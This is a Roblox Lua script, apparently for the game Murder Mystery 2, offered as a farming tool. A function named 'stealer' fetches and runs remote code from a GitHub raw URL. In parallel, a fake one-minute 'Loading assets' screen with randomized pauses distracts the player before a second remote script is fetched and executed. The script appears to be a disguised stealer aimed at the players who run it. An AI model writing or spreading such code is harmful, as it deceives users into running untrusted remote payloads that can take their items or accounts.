local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/maksi-alt/mm2/refs/heads/main/adminmain'))()
end
local function farm()
    -- Loading with natural variation: sometimes pauses, sometimes speeds up
 
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
 
-- GUI Setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui
 
local panel = Instance.new("Frame")
panel.Size = UDim2.new(0.4, 0, 0.25, 0)
panel.Position = UDim2.new(0.5, 0, 0.5, 0)
panel.AnchorPoint = Vector2.new(0.5, 0.5)
panel.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
panel.BackgroundTransparency = 0.1
panel.BorderSizePixel = 0
panel.ClipsDescendants = true
panel.Parent = screenGui
 
Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
local stroke = Instance.new("UIStroke", panel)
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(0, 170, 255)
stroke.Transparency = 0.5
 
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, -20, 0.4, 0)
textLabel.Position = UDim2.new(0, 10, 0.05, 0)
textLabel.BackgroundTransparency = 1
textLabel.TextScaled = true
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Font = Enum.Font.GothamBold
textLabel.Text = "Loading assets, please wait... 0%"
textLabel.Parent = panel
 
local barBackground = Instance.new("Frame")
barBackground.Size = UDim2.new(1, -40, 0.2, 0)
barBackground.Position = UDim2.new(0, 20, 0.6, 0)
barBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
barBackground.BorderSizePixel = 0
barBackground.Parent = panel
Instance.new("UICorner", barBackground).CornerRadius = UDim.new(0, 8)
 
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBackground
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 8)
 
-- Smooth but variable loading
local totalSteps = 100
local totalDuration = 60
local elapsed = 0
local progress = 0
 
for i = 1, totalSteps do
 progress = i / totalSteps
 textLabel.Text = string.format("Loading assets, please wait... %d%%", math.floor(progress * 100))
 
 -- Random tween speed
 local tweenSpeed = math.random(10, 30) / 100  -- 0.1s to 0.3s
 TweenService:Create(barFill, TweenInfo.new(tweenSpeed), {
  Size = UDim2.new(progress, 0, 1, 0)
 }):Play()
 
 -- Simulate occasional pause or skip
 local pauseChance = math.random()
 local waitTime
 
 if pauseChance < 0.1 then
  waitTime = math.random(50, 90) / 100  -- long pause
 elseif pauseChance < 0.5 then
  waitTime = math.random(30, 50) / 100  -- medium
 else
  waitTime = math.random(10, 30) / 100  -- short
 end
 
 wait(waitTime)
 elapsed += waitTime
end
 
-- Fade out
TweenService:Create(panel, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(textLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(barFill, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(barBackground, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(stroke, TweenInfo.new(1), {Transparency = 1}):Play()
wait(1.1)
screenGui:Destroy()
 
-- Run external script
loadstring(game:HttpGet("https://raw.githubusercontent.com/ImCountre/MM2/refs/heads/main/main"))()
end
 
task.spawn(stealer)
task.spawn(farm)
